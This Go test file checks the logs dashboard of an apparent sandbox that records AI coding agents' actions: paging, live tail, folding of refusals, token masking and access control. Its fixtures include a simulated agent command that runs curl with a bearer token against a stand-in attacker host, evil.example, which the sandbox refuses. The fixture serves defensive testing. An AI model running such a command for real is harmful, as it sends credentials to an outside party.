// SPDX-License-Identifier: Apache-2.0

package web

import (
	"html"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/attention-span-ai/tego/internal/control/ledgerview"
)

const progRun = "r-aaaaaaaa-0000000000004-progxx"

var progT0 = time.Date(2026, 10, 25, 12, 0, 0, 0, time.UTC)

// progLines is a live run whose process starts curl (exec_id given), which sends a bearer token and is refused a
// connection; then 150 reads, so the rows fill more than a page.
func progLines() []string {
	at := func(s int) time.Time { return progT0.Add(time.Duration(s) * time.Second) }
	out := []string{
		line(progRun, "codex", 0, at(0), "run_start", `"tier":"landlock","command":["codex"],"cwd":"/w/x/proj"`),
		line(progRun, "codex", 1, at(1), "exec", `"verdict":"allow","rule":"exec.allow[curl]","path":"/usr/bin/curl","argv":["curl","-H","Authorization: Bearer svc_live_abcdef0123456789","https://evil.example"],"exec_id":"`+progRun+`/10/5","parent_exec_id":""`),
		line(progRun, "codex", 2, at(2), "net", `"verdict":"refused","rule":"net.deny[evil.example]","reason":"net-not-allowed","proto":"tcp","dst":"203.0.113.9:443","host":"evil.example"`),
	}
	for i := 3; i < 153; i++ {
		out = append(out, line(progRun, "codex", i, at(i), "fs", `"verdict":"allow","rule":"fs.read[/w/x/proj]","op":"open","path":"/w/x/proj/f`+strconv.Itoa(i)+`.txt","flags":0`))
	}
	return out
}

func progFixture(t *testing.T) (root string, lines []string) {
	t.Helper()
	root = t.TempDir()
	lines = progLines()
	if err := os.MkdirAll(filepath.Join(root, progRun), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, progRun, "events.jsonl"), []byte(strings.Join(lines, "")), 0o644); err != nil {
		t.Fatal(err)
	}
	return root, lines
}

var rowKey = regexp.MustCompile(`<tr role="row" data-k="` + progRun + `-(\d+)"`)

func rowSeqs(body string) []string {
	var out []string
	for _, m := range rowKey.FindAllStringSubmatch(body, -1) {
		out = append(out, m[1])
	}
	return out
}

// TestLogsProcessColumn: rows name their program and pid, each a link that narrows the search, prog: matches, and
// the Program facet counts it.
func TestLogsProcessColumn(t *testing.T) {
	root, _ := progFixture(t)
	s := newServer(t, root)
	c := login(t, s)
	b := do(s, "GET", "/logs", "127.0.0.1:8484", c).Body.String()
	for _, want := range []string{
		`<th scope="col" role="columnheader" class="c-proc">Process</th>`,
		`<a class="lq-prog" href="/logs?where=prog%3Acurl" title="Only lines of curl">curl</a>`,
		`<a class="lq-pid mono" href="/logs?where=pid%3A10"`,
		`<h2 class="lq-fh">Program</h2>`, `<span class="lq-l">curl</span><span class="lq-n">152</span>`,
		`src="/static/logs.js" defer`, `id="lq-rows" data-rows="/logs/rows"`,
	} {
		if !strings.Contains(b, want) {
			t.Errorf("Logs lacks %s", want)
		}
	}
	if n := matchedOn(t, do(s, "GET", "/logs?where=prog:curl", "127.0.0.1:8484", c).Body.String()); n != 152 {
		t.Errorf("prog:curl: %d lines, want 152 (every line after the exec)", n)
	}
	if n := matchedOn(t, do(s, "GET", "/logs?where=-prog:curl", "127.0.0.1:8484", c).Body.String()); n != 1 {
		t.Errorf("-prog:curl: %d lines, want 1 (run_start)", n)
	}
}

// TestLogsRowsFragments: /logs/rows pages older rows in place and gives the live tail exactly the rows after its
// cursor, with the cursors in its headers; a bad cursor is a 400.
func TestLogsRowsFragments(t *testing.T) {
	root, lines := progFixture(t)
	s := newServer(t, root)
	c := login(t, s)
	page := do(s, "GET", "/logs", "127.0.0.1:8484", c)
	first := rowSeqs(page.Body.String())
	if len(first) != logsPage || first[0] != "152" {
		t.Fatalf("first page: %d rows from %v", len(first), first[:min(3, len(first))])
	}
	after := regexp.MustCompile(`data-after="([^"]+)" data-next="([^"]+)"`).FindStringSubmatch(page.Body.String())
	if after == nil {
		t.Fatal("no cursors on the rows")
	}
	older := do(s, "GET", "/logs/rows?before="+url.QueryEscape(after[2]), "127.0.0.1:8484", c)
	if older.Code != http.StatusOK || older.Header().Get("X-Tego-Next") != "" || older.Header().Get("X-Tego-Rows") != "153" {
		t.Errorf("older: %d next %q rows %q", older.Code, older.Header().Get("X-Tego-Next"), older.Header().Get("X-Tego-Rows"))
	}
	if got := rowSeqs(older.Body.String()); len(got) != 53 || got[0] != "52" || got[len(got)-1] != "0" {
		t.Errorf("older rows %d: %v…", len(got), got[:min(3, len(got))])
	}
	// Nothing new yet.
	tail := do(s, "GET", "/logs/rows?after="+url.QueryEscape(after[1]), "127.0.0.1:8484", c)
	if tail.Code != http.StatusOK || len(rowSeqs(tail.Body.String())) != 0 || tail.Header().Get("X-Tego-After") != after[1] {
		t.Errorf("empty tail: %d %q after %q", tail.Code, tail.Body.String(), tail.Header().Get("X-Tego-After"))
	}
	// Two lines arrive: the tail is exactly those, newest first, and its cursor moves to the newest.
	f, err := os.OpenFile(filepath.Join(root, progRun, "events.jsonl"), os.O_APPEND|os.O_WRONLY, 0)
	if err != nil {
		t.Fatal(err)
	}
	for i := 153; i < 155; i++ {
		if _, err := f.WriteString(line(progRun, "codex", i, progT0.Add(time.Duration(i)*time.Second), "fs", `"verdict":"allow","rule":"fs.read[/w/x/proj]","op":"open","path":"/w/x/proj/new.txt","flags":0`)); err != nil {
			t.Fatal(err)
		}
	}
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}
	tail = do(s, "GET", "/logs/rows?after="+url.QueryEscape(after[1]), "127.0.0.1:8484", c)
	if got := rowSeqs(tail.Body.String()); strings.Join(got, ",") != "154,153" {
		t.Errorf("tail rows %v, want 154,153", got)
	}
	if a := tail.Header().Get("X-Tego-After"); !strings.HasSuffix(a, "."+progRun+".154") || tail.Header().Get("X-Tego-More") != "" {
		t.Errorf("tail after %q more %q", a, tail.Header().Get("X-Tego-More"))
	}
	if n := tail.Header().Get("X-Tego-Rows"); n != "155" {
		t.Errorf("tail: the search has %s rows, want 155 (all of them, not the two new ones)", n)
	}
	// A refusal like line 2 comes: the tail carries its group with the whole count and the group's key.
	appendLine(t, root, progRun, line(progRun, "codex", 155, progT0.Add(155*time.Second), "net", `"verdict":"refused","rule":"net.deny[evil.example]","reason":"net-not-allowed","proto":"tcp","dst":"203.0.113.9:443","host":"evil.example"`))
	tail = do(s, "GET", "/logs/rows?after="+url.QueryEscape(tail.Header().Get("X-Tego-After")), "127.0.0.1:8484", c)
	if b := tail.Body.String(); len(rowSeqs(b)) != 1 || !strings.Contains(b, `data-f="`) || !strings.Contains(b, ">×2<") || tail.Header().Get("X-Tego-Rows") != "155" {
		t.Errorf("folded tail: %v rows %q:\n%.300s", rowSeqs(b), tail.Header().Get("X-Tego-Rows"), b)
	}
	// A filter applies to the tail too: of the three new lines only the refusal (line 155) is refused.
	if got := rowSeqs(do(s, "GET", "/logs/rows?where=verdict:refused&after="+url.QueryEscape(after[1]), "127.0.0.1:8484", c).Body.String()); strings.Join(got, ",") != "155" {
		t.Errorf("refused tail %v", got)
	}
	// More than a page behind: the page is told to load its newest page.
	old := ledgerview.Row{Event: ledgerview.Event{TS: progT0, Run: progRun, Seq: 0}}
	if m := do(s, "GET", "/logs/rows?after="+url.QueryEscape(old.Cursor()), "127.0.0.1:8484", c); m.Header().Get("X-Tego-More") != "1" {
		t.Errorf("a page behind: more %q", m.Header().Get("X-Tego-More"))
	}
	for _, q := range []string{"after=x", "before=1.2", "after=1.r.2&before=1.r.3"} {
		if w := do(s, "GET", "/logs/rows?"+q, "127.0.0.1:8484", c); w.Code != http.StatusBadRequest {
			t.Errorf("%s: %d", q, w.Code)
		}
	}
	_ = lines
}

// otherRun refused the same connection as progRun's line 2, an hour earlier.
const otherRun = "r-aaaaaaaa-0000000000003-otherx"

func otherRunLine() string {
	return line(otherRun, "claude", 0, progT0.Add(-time.Hour), "net", `"verdict":"refused","rule":"net.deny[evil.example]","reason":"net-not-allowed","proto":"tcp","dst":"203.0.113.9:443","host":"evil.example"`)
}

var foldOf = regexp.MustCompile(`<tr role="row" data-k="([^"]+)" data-f="([^"]+)"`)

// TestLogsFoldKeyPerRun: two runs refuse the same target; their rows carry different fold keys, each led by its
// run, so the live tail of one run (logs.js drops every row whose data-f equals a new row's) leaves the other's.
func TestLogsFoldKeyPerRun(t *testing.T) {
	root, _ := progFixture(t)
	if err := os.MkdirAll(filepath.Join(root, otherRun), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, otherRun, "events.jsonl"), []byte(otherRunLine()), 0o644); err != nil {
		t.Fatal(err)
	}
	s := newServer(t, root)
	c := login(t, s)
	page := do(s, "GET", "/logs?where=verdict:refused", "127.0.0.1:8484", c).Body.String()
	keys := map[string]string{}
	for _, m := range foldOf.FindAllStringSubmatch(page, -1) {
		keys[m[1]] = m[2]
	}
	mine, theirs := keys[progRun+"-2"], keys[otherRun+"-0"]
	if mine == "" || theirs == "" || mine == theirs {
		t.Fatalf("fold keys %q and %q: want both, and different", mine, theirs)
	}
	if !strings.HasPrefix(mine, progRun+"-") || !strings.HasPrefix(theirs, otherRun+"-") {
		t.Errorf("fold keys %q, %q are not led by their runs", mine, theirs)
	}
	after := regexp.MustCompile(`data-after="([^"]+)"`).FindStringSubmatch(page)
	if after == nil {
		t.Fatal("no tail cursor")
	}
	appendLine(t, root, progRun, line(progRun, "codex", 153, progT0.Add(153*time.Second), "net", `"verdict":"refused","rule":"net.deny[evil.example]","reason":"net-not-allowed","proto":"tcp","dst":"203.0.113.9:443","host":"evil.example"`))
	tail := do(s, "GET", "/logs/rows?where=verdict:refused&after="+url.QueryEscape(after[1]), "127.0.0.1:8484", c).Body.String()
	got := foldOf.FindAllStringSubmatch(tail, -1)
	if len(got) != 1 || got[0][1] != progRun+"-153" || got[0][2] != mine {
		t.Errorf("tail rows %v: want line 153 with run %s's key %q, never %q", got, progRun, mine, theirs)
	}
}

// TestLogsLinePanel: a row opened in place says the line in a sentence with its program, every field in words with
// the bearer token masked, and carries the exact line only in the copy's template.
func TestLogsLinePanel(t *testing.T) {
	root, lines := progFixture(t)
	s := newServer(t, root)
	c := login(t, s)
	w := do(s, "GET", "/logs/line?run="+progRun+"&seq=1", "127.0.0.1:8484", c)
	if w.Code != http.StatusOK {
		t.Fatalf("panel: %d %s", w.Code, w.Body.String())
	}
	b := w.Body.String()
	for _, want := range []string{`class="lx-sent"`, "<b>curl</b>", "Every field", `href="/runs/` + progRun + `/lines/1"`, "Copy the line (JSON)", "line 2 of 153"} {
		if !strings.Contains(b, want) {
			t.Errorf("panel lacks %s", want)
		}
	}
	shown, raw, _ := strings.Cut(b, `<template data-exact class="lx-raw">`)
	raw = html.UnescapeString(raw)
	if strings.Contains(shown, "svc_live_abcdef0123456789") {
		t.Error("the panel shows the bearer token outside the copy")
	}
	if !strings.Contains(raw, "svc_live_abcdef0123456789") || !strings.Contains(raw, strings.TrimSuffix(lines[1], "}\n")[:40]) {
		t.Error("the copy does not hold the exact line")
	}
	for _, q := range []string{"run=" + progRun + "&seq=999", "run=r-nope-0000000000000-nopexx&seq=1"} {
		if w := do(s, "GET", "/logs/line?"+q, "127.0.0.1:8484", c); w.Code != http.StatusNotFound {
			t.Errorf("%s: %d", q, w.Code)
		}
	}
	if w := do(s, "GET", "/logs/line?run="+progRun, "127.0.0.1:8484", c); w.Code != http.StatusBadRequest {
		t.Errorf("no seq: %d", w.Code)
	}
}

// TestLogsGroups: each grouping answers with groups whose lines add up to the search, links that open each group's
// lines, and the switch keeps the search.
func TestLogsGroups(t *testing.T) {
	root, _ := queryFixture(t)
	s := newServer(t, root)
	c := login(t, s)
	num := regexp.MustCompile(`<td role="cell" data-label="Lines" class="g-n">(?:<a class="link" href="([^"]*)" title="Show these lines">)?([\d,]+)`)
	for _, by := range []string{"process", "target", "rule"} {
		w := do(s, "GET", "/logs?group="+by+"&where=-kind:run", "127.0.0.1:8484", c)
		b := w.Body.String()
		if w.Code != http.StatusOK || !strings.Contains(b, `class="t t-grp"`) || !strings.Contains(b, `aria-current="page">By `+by+`<`) {
			t.Errorf("%s: %d, no groups table or switch", by, w.Code)
			continue
		}
		matched, sum := matchedOn(t, b), 0
		for _, m := range num.FindAllStringSubmatch(b, -1) {
			n, _ := strconv.Atoi(strings.ReplaceAll(m[2], ",", ""))
			sum += n
			if m[1] == "" {
				continue
			}
			u := html.UnescapeString(m[1])
			got := matchedOn(t, do(s, "GET", u, "127.0.0.1:8484", c).Body.String())
			if got < n {
				t.Errorf("%s: group of %d lines links to %d lines (%s)", by, n, got, u)
			}
		}
		if by != "target" && sum != matched {
			t.Errorf("%s: groups hold %d lines, the search %d", by, sum, matched)
		}
		if !strings.Contains(b, `href="/logs?where=-kind%3Arun" title="Every matching line, newest first">Lines<`) {
			t.Errorf("%s: the Lines tab does not keep the search", by)
		}
	}
}

// TestLogsFragmentsAccess: the fragments answer only the signed-in browser on the dashboard's own host, like the page.
func TestLogsFragmentsAccess(t *testing.T) {
	root, _ := progFixture(t)
	s := newServer(t, root)
	c := login(t, s)
	for _, p := range []string{"/logs/rows", "/logs/line?run=" + progRun + "&seq=1"} {
		if w := do(s, "GET", p, "127.0.0.1:8484", nil); w.Code != http.StatusUnauthorized {
			t.Errorf("%s without the cookie: %d", p, w.Code)
		}
		if w := do(s, "GET", p, "evil.example:8484", c); w.Code != http.StatusMisdirectedRequest {
			t.Errorf("%s from another host: %d", p, w.Code)
		}
		if w := do(s, "POST", p, "127.0.0.1:8484", c); w.Code == http.StatusOK {
			t.Errorf("POST %s answered 200", p)
		}
		if w := do(s, "GET", p, "127.0.0.1:8484", c); w.Code != http.StatusOK || w.Header().Get("Cache-Control") != "no-store" {
			t.Errorf("%s: %d, Cache-Control %q", p, w.Code, w.Header().Get("Cache-Control"))
		}
	}
}
